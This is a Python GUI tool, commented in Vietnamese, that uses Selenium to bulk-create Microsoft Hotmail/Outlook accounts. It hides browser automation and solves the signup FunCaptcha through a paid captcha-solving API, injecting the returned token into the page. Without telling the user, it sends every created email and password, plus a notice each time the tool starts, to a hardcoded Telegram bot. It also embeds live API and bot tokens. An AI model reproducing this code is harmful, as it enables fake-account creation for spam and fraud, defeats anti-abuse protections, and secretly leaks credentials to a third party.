from PyQt6.QtWidgets import QApplication, QMainWindow, QTableWidget, QTableWidgetItem, QVBoxLayout, QWidget
import requests
from PyQt6.QtWidgets import QApplication, QMainWindow, QPushButton, QMessageBox
from PyQt6 import QtCore, QtGui, QtWidgets
from threading import Thread
import sys
class Ui_Reghotmail(object):
    def setupUi(self, Reghotmail):
        Reghotmail.setObjectName("Reghotmail")
        Reghotmail.resize(1185, 366)
        self.centralwidget = QtWidgets.QWidget(parent=Reghotmail)
        self.centralwidget.setObjectName("centralwidget")
        self.tableWidget = QtWidgets.QTableWidget(parent=self.centralwidget)
        self.tableWidget.setGeometry(QtCore.QRect(10, 10, 611, 291))
        self.tableWidget.setObjectName("tableWidget")
        self.tableWidget.setColumnCount(4)
        self.tableWidget.setRowCount(0)
        item = QtWidgets.QTableWidgetItem()
        self.tableWidget.setHorizontalHeaderItem(0, item)
        item = QtWidgets.QTableWidgetItem()
        self.tableWidget.setHorizontalHeaderItem(1, item)
        item = QtWidgets.QTableWidgetItem()
        self.tableWidget.setHorizontalHeaderItem(2, item)
        item = QtWidgets.QTableWidgetItem()
        self.tableWidget.setHorizontalHeaderItem(3, item)
        self.lineEdit = QtWidgets.QLineEdit(parent=self.centralwidget)
        self.lineEdit.setGeometry(QtCore.QRect(70, 320, 471, 20))
        self.lineEdit.setObjectName("lineEdit")
        self.pushButton_4 = QtWidgets.QPushButton(parent=self.centralwidget)
        self.pushButton_4.setGeometry(QtCore.QRect(550, 320, 75, 23))
        self.pushButton_4.setStyleSheet("")
        self.pushButton_4.setObjectName("pushButton_4")
        self.label_4 = QtWidgets.QLabel(parent=self.centralwidget)
        self.label_4.setGeometry(QtCore.QRect(10, 320, 51, 20))
        self.label_4.setObjectName("label_4")
        self.groupBox = QtWidgets.QGroupBox(parent=self.centralwidget)
        self.groupBox.setGeometry(QtCore.QRect(640, 10, 201, 71))
        self.groupBox.setObjectName("groupBox")
        self.pushButton_2 = QtWidgets.QPushButton(parent=self.groupBox)
        self.pushButton_2.setGeometry(QtCore.QRect(100, 30, 75, 23))
        self.pushButton_2.setStyleSheet("background-color: rgb(170, 85, 0);")
        self.pushButton_2.setObjectName("pushButton_2")
        self.pushButton = QtWidgets.QPushButton(parent=self.groupBox)
        self.pushButton.setGeometry(QtCore.QRect(10, 30, 75, 23))
        self.pushButton.setStyleSheet("background-color: rgb(85, 255, 127);")
        self.pushButton.setObjectName("pushButton")
        self.groupBox_2 = QtWidgets.QGroupBox(parent=self.centralwidget)
        self.groupBox_2.setGeometry(QtCore.QRect(860, 20, 281, 221))
        self.groupBox_2.setObjectName("groupBox_2")
        self.textEdit = QtWidgets.QTextEdit(parent=self.groupBox_2)
        self.textEdit.setGeometry(QtCore.QRect(30, 50, 241, 91))
        self.textEdit.setObjectName("textEdit")
        self.label_3 = QtWidgets.QLabel(parent=self.groupBox_2)
        self.label_3.setGeometry(QtCore.QRect(70, 20, 201, 21))
        self.label_3.setObjectName("label_3")
        self.spinBox = QtWidgets.QSpinBox(parent=self.groupBox_2)
        self.spinBox.setGeometry(QtCore.QRect(90, 150, 42, 22))
        self.spinBox.setMaximum(99999)
        self.spinBox.setObjectName("spinBox")
        self.label = QtWidgets.QLabel(parent=self.groupBox_2)
        self.label.setGeometry(QtCore.QRect(40, 150, 47, 20))
        self.label.setObjectName("label")
        self.label_2 = QtWidgets.QLabel(parent=self.groupBox_2)
        self.label_2.setGeometry(QtCore.QRect(160, 150, 47, 20))
        self.label_2.setObjectName("label_2")
        self.spinBox_2 = QtWidgets.QSpinBox(parent=self.groupBox_2)
        self.spinBox_2.setGeometry(QtCore.QRect(210, 150, 42, 22))
        self.spinBox_2.setMaximum(99999)
        self.spinBox_2.setObjectName("spinBox_2")
        self.comboBox_2 = QtWidgets.QComboBox(parent=self.groupBox_2)
        self.comboBox_2.setGeometry(QtCore.QRect(90, 180, 61, 22))
        self.comboBox_2.setObjectName("comboBox_2")
        self.comboBox_2.addItem("")
        self.comboBox_2.addItem("")
        self.comboBox_2.addItem("")
        self.label_5 = QtWidgets.QLabel(parent=self.groupBox_2)
        self.label_5.setGeometry(QtCore.QRect(40, 180, 47, 20))
        self.label_5.setObjectName("label_5")
        self.groupBox_3 = QtWidgets.QGroupBox(parent=self.centralwidget)
        self.groupBox_3.setGeometry(QtCore.QRect(640, 90, 201, 111))
        self.groupBox_3.setObjectName("groupBox_3")
        self.lineEdit_2 = QtWidgets.QLineEdit(parent=self.groupBox_3)
        self.lineEdit_2.setGeometry(QtCore.QRect(10, 60, 121, 20))
        self.lineEdit_2.setText("")
        self.lineEdit_2.setObjectName("lineEdit_2")
        self.pushButton_3 = QtWidgets.QPushButton(parent=self.groupBox_3)
        self.pushButton_3.setGeometry(QtCore.QRect(140, 60, 51, 21))
        self.pushButton_3.setStyleSheet("background-color: rgb(85, 255, 127);")
        self.pushButton_3.setObjectName("pushButton_3")
        self.comboBox = QtWidgets.QComboBox(parent=self.groupBox_3)
        self.comboBox.setGeometry(QtCore.QRect(20, 30, 161, 22))
        self.comboBox.setObjectName("comboBox")
        self.comboBox.addItem("")
        self.comboBox.addItem("")
        self.comboBox.addItem("")
        Reghotmail.setCentralWidget(self.centralwidget)
        self.statusbar = QtWidgets.QStatusBar(parent=Reghotmail)
        self.statusbar.setObjectName("statusbar")
        Reghotmail.setStatusBar(self.statusbar)
        self.pushButton.clicked.connect(self.Batdau)
        self.pushButton_2.clicked.connect(self.Dung)

        
        self.retranslateUi(Reghotmail)
        QtCore.QMetaObject.connectSlotsByName(Reghotmail)
    def Dung(self):
        print("dừng")
        self.LUONGCGA = False
    def Reg(self,NAME,stt,dong):
        xx=stt*400
        yy=0
        if xx >= 1600 and xx < 3200: 
            yy=400
            xx=(stt-4)*400
        if xx >= 3200 and xx < 4800:
            yy=800
            xx=(stt-8)*400
        if xx >= 4800 and xx < 5400:
            yy=1200
            xx=(stt-12)*400
        if xx >= 5400 and xx < 6000:
            yy=1600
            xx=(stt-16)*400
        def generate_random_string():
            first_char = random.choice(string.ascii_lowercase)  # Chọn ngẫu nhiên một chữ cái viết thường làm ký tự đầu tiên
            remaining_chars = ''.join(random.choices(string.ascii_letters + string.digits, k=15))  # Chọn các ký tự còn lại
            
            random_string = first_char + remaining_chars
            return random_string

        NAme1=NAME.split(" ")[0]
        NAme2=NAME.split(" ")[1]+NAME.split(" ")[2]

        from selenium import webdriver
        from selenium.webdriver.common.by import By
        from selenium.webdriver.common.keys import Keys
        from selenium.webdriver.chrome.options import Options
        from selenium.webdriver.support.ui import WebDriverWait as WebWait
        from selenium.webdriver.support import expected_conditions as EC
        import time, requests, json ,string ,random

        options = Options()
        prefs = {
            "credentials_enable_service": False,
            "profile.password_manager_enabled": False
        }
        options.add_experimental_option("prefs", prefs)
        options.add_argument("--disable-blink-features=AutomationControlled")
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_argument(f"window-position={xx},{yy}")
        options.add_argument(f"window-size=400,400")
        TK=str(generate_random_string())+"@hotmail.com"
        MK=str(generate_random_string())
        self.tableWidget.setItem(dong, 0, QtWidgets.QTableWidgetItem(f"{TK}"))
        self.tableWidget.setItem(dong, 1, QtWidgets.QTableWidgetItem(f"{MK}"))
        self.tableWidget.setItem(dong, 3, QtWidgets.QTableWidgetItem(f"Vào web"))

        options.add_argument('--app=https://signup.live.com')
        driver = webdriver.Chrome(options=options)
        
        def a(KEY_API, SITE_KEY, SITE_URL):
            A = requests.get(f"https://api.rockcaptcha.com/FunCaptchaTokenTask?apikey={KEY_API}&sitekey={SITE_KEY}&siteurl={SITE_URL}").json()
            print(A)
            B = requests.get(f"https://api.rockcaptcha.com/getresult?apikey={KEY_API}&taskId={A['TaskId']}").json()
            print(B)
            while True:
                B = requests.get(f"https://api.rockcaptcha.com/getresult?apikey={KEY_API}&taskId={A['TaskId']}").json()
                if B['Status'] == 'PROCESSING':
                    pass
                else:
                    break
                time.sleep(1)
            return B

        print('Truy Cập web')
        driver.get("https://signup.live.com/?lic=1")

        # Chờ đợi đến khi phần tử usernameInput xuất hiện
        WebWait(driver, 100).until(EC.presence_of_element_located((By.ID, "usernameInput")))
        print('Điền Mail')
        self.tableWidget.setItem(dong, 3, QtWidgets.QTableWidgetItem(f"Điền Mail"))
        
        driver.find_element(By.ID, "usernameInput").send_keys(TK)
        driver.find_element(By.ID, "nextButton").click()

        # Chờ đợi đến khi phần tử Password xuất hiện
        self.tableWidget.setItem(dong, 3, QtWidgets.QTableWidgetItem(f"Nhập mật Khẩu"))

        WebWait(driver, 100).until(EC.presence_of_element_located((By.ID, "Password")))
        print('Điền Pass')
        driver.find_element(By.ID, "Password").send_keys(MK)
        driver.find_element(By.ID, "nextButton").click()
        self.tableWidget.setItem(dong, 3, QtWidgets.QTableWidgetItem(f"Nhập Tên"))

        # Chờ đợi đến khi phần tử lastNameInput xuất hiện
        WebWait(driver, 100).until(EC.presence_of_element_located((By.ID, "lastNameInput")))
        print('Điền Tên')
        driver.find_element(By.ID, "lastNameInput").send_keys(NAme1)
        driver.find_element(By.ID, "firstNameInput").click()
        driver.find_element(By.ID, "firstNameInput").send_keys(NAme2)
        driver.find_element(By.ID, "nextButton").click()
        self.tableWidget.setItem(dong, 3, QtWidgets.QTableWidgetItem(f"Nhập Ngày Sinh"))

        # Chờ đợi đến khi phần tử BirthYear xuất hiện
        WebWait(driver, 100).until(EC.presence_of_element_located((By.ID, "BirthYear")))
        print('Ngày Sinh')
        driver.find_element(By.ID, "BirthYear").click()
        driver.find_element(By.ID, "BirthYear").send_keys("2001")
        driver.find_element(By.ID, "BirthMonth").click()
        dropdown = driver.find_element(By.ID, "BirthMonth")
        try:dropdown.find_element(By.XPATH, "//option[. = 'January']").click()
        except:dropdown.find_element(By.XPATH, "//option[. = 'Tháng Một']").click()
        driver.find_element(By.ID, "BirthDay").click()
        dropdown = driver.find_element(By.ID, "BirthDay")
        dropdown.find_element(By.XPATH, "//option[. = '19']").click()
        driver.find_element(By.ID, "nextButton").click()
        self.tableWidget.setItem(dong, 3, QtWidgets.QTableWidgetItem(f"Giải Captcha"))

        print('Captcha')
        KEY_API = 'd3b66e6b2c7c40929ce3714c05bf94c7'
        SITE_KEY = 'B7D8911C-5CC8-A9A3-35B0-554ACEE604DA'
        SITE_URL = 'https://signup.live.com/'

        
        # Chờ đợi iframe xuất hiện và chuyển vào iframe
        WebWait(driver, 100).until(EC.frame_to_be_available_and_switch_to_it((By.ID, 'enforcementFrame')))
        try:
            ID = a(KEY_API, SITE_KEY, SITE_URL)['Data']['Token']
            driver.execute_script('parent.postMessage(JSON.stringify({eventId:"challenge-complete",payload:{sessionToken:"' + ID + '"}}),"*")')
            self.tableWidget.setItem(dong, 3, QtWidgets.QTableWidgetItem(f"Tạo Thành Công !!"))
            time.sleep(15)
            print(f'{TK}|{MK}')
            requests.get(f"https://api.telegram.org/bot7055705243:AAFIdPKDh2Npaz0LtGkujlCd_YU5MdIqLQ8/sendMessage?chat_id=5724397112&text=Tạo Thành Công\n{TK}|{MK}")
            return f'{TK}|{MK}'

        except :
            self.tableWidget.setItem(dong, 3, QtWidgets.QTableWidgetItem(f"Lỗi Không Giải Được Captcha !!"))
            requests.get("https://api.telegram.org/bot7055705243:AAFIdPKDh2Npaz0LtGkujlCd_YU5MdIqLQ8/sendMessage?chat_id=5724397112&text=Tạo Lỗi")
            return False
        driver.quit()
    def Batdau(self):
        requests.get("https://api.telegram.org/bot7055705243:AAFIdPKDh2Npaz0LtGkujlCd_YU5MdIqLQ8/sendMessage?chat_id=5724397112&text=Có Người Bắt Đầu Tool")
        self.LUONGCGA = True
        def Run4():
            self.LUONGCGA = True
            for i in range(int(self.spinBox.value())):
                self.trunggian1=i
                def Run5():
                    i=self.trunggian1
                    while self.LUONGCGA :
                        NAME=requests.get("https://story-shack-cdn-v2.glitch.me/generators/vietnamese-name-generator/male?count=2").json()['data'][0]['name']
                        row_number = self.tableWidget.rowCount()
                        self.tableWidget.insertRow(row_number)
                        ACC=self.Reg(NAME,i,row_number)
                        if ACC != False:
                            file_path = "hotmail.txt"
                            with open(file_path, "a+", encoding="utf-8") as file:
                                file.write(ACC+"\n")
                Thread(target=Run5).start()


        Thread(target=Run4).start()
    def Thongbao(self,text):
        msg_box = QMessageBox()
        msg_box.setText(text)
        msg_box.setWindowTitle("Lỗi")
        msg_box.setIcon(QMessageBox.Icon.Information)
        msg_box.exec()
    def retranslateUi(self, Reghotmail):
        _translate = QtCore.QCoreApplication.translate
        Reghotmail.setWindowTitle(_translate("Reghotmail", "MainWindow"))
        item = self.tableWidget.horizontalHeaderItem(0)
        item.setText(_translate("Reghotmail", "Mail"))
        item = self.tableWidget.horizontalHeaderItem(1)
        item.setText(_translate("Reghotmail", "Mật Khẩu"))
        item = self.tableWidget.horizontalHeaderItem(2)
        item.setText(_translate("Reghotmail", "Proxy"))
        item = self.tableWidget.horizontalHeaderItem(3)
        item.setText(_translate("Reghotmail", "Tình Trạng"))
        self.pushButton_4.setText(_translate("Reghotmail", "Tệp"))
        self.label_4.setText(_translate("Reghotmail", "Xuất Mail"))
        self.groupBox.setTitle(_translate("Reghotmail", "Điều Kiển"))
        self.pushButton_2.setText(_translate("Reghotmail", "Dừng"))
        self.pushButton.setText(_translate("Reghotmail", "Chạy"))
        self.groupBox_2.setTitle(_translate("Reghotmail", "Cài Đặt"))
        self.label_3.setText(_translate("Reghotmail", "Key API Proxy 1 Dòng 1 Key"))
        self.label.setText(_translate("Reghotmail", "Số Luồng"))
        self.label_2.setText(_translate("Reghotmail", "Số Lượng"))
        self.comboBox_2.setItemText(0, _translate("Reghotmail", "Hotmail"))
        self.comboBox_2.setItemText(1, _translate("Reghotmail", "outlock"))
        self.comboBox_2.setItemText(2, _translate("Reghotmail", "outlock.vn"))
        self.label_5.setText(_translate("Reghotmail", "Domain"))
        self.groupBox_3.setTitle(_translate("Reghotmail", "Cấu Hình Captcha"))
        self.pushButton_3.setText(_translate("Reghotmail", "Check"))
        self.comboBox.setItemText(0, _translate("Reghotmail", "https://rockcaptcha.com/"))
        self.comboBox.setItemText(1, _translate("Reghotmail", "https://rockcaptcha.com/"))
        self.comboBox.setItemText(2, _translate("Reghotmail", "https://rockcaptcha.com/"))
        self.tableWidget.setColumnWidth(3, 300)


if __name__ == "__main__":
    import sys
    app = QtWidgets.QApplication(sys.argv)
    Reghotmail = QtWidgets.QMainWindow()
    ui = Ui_Reghotmail()
    ui.setupUi(Reghotmail)
    Reghotmail.show()
    sys.exit(app.exec())
